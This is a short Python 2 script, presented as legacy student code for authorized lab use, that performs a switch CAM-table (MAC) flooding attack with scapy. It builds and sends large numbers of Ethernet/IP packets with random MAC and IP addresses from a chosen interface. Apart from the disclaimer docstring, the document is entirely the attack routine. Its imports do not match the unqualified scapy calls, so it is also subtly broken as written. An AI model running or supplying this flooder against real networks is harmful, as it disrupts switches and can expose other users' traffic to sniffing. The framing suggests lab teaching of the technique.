#!/usr/bin/env python
"""Switch CAM-table (MAC) flooding demonstration.

EDUCATIONAL / AUTHORIZED-TESTING USE ONLY. Run only inside an isolated lab
network you own, or with explicit written permission. See this folder's
README.md for how the technique works and, more importantly, how to detect
and defend against it.

Note: this is legacy student code kept as an original reference. It was
written for Python 2 and an isolated Linux lab; adapt it to your own
authorized environment before use.
"""

import sys
import scapy.all






# Sending a flood of IP packets with random IP and MAC addresses in order to overload the target MAC table
def MacFlood(Interface,PckNbr):
    packet_list = []		#initializing packet_list to hold all the packets
    #Preparing the list of packets to send improves the sending rate
    for i in xrange(1,PckNbr):
        packet  = Ether(src = RandMAC(),dst= RandMAC())/IP(src=RandIP(),dst=RandIP())
        packet_list.append(packet)
    sendp(packet_list,iface=Interface)


    return 0
